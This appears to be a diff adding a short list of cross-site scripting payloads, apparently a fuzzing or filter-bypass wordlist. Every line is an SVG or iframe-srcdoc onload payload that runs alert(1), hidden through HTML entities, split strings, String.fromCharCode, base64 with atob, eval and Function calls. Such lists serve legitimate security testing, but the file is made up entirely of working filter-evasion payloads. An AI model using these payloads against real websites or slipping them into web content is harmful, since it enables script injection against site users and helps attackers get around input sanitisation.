@@ -1,0 +1,13 @@
+<iframe srcdoc="<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>">
+<svg onload="window['al'+'ert'](1)">
+<iframe srcdoc="<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>">
+<svg/onload=eval(atob('YWxlcnQoMSk='))>
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))>">
+<iframe srcdoc="<svg onload=Function('al'+'ert(1)')()>">
+<svg/onload=Function('al'+'ert(1)')()>
+<iframe srcdoc="<svg onload=window['al'+'ert'](1)>">
+<svg/onload=window['al'+'ert'](1)>
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>">
+<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<iframe srcdoc="<svg onload=window['ev'+'al']('al'+'ert(1)')>">
+<svg/onload=window['ev'+'al']('al'+'ert(1)')>
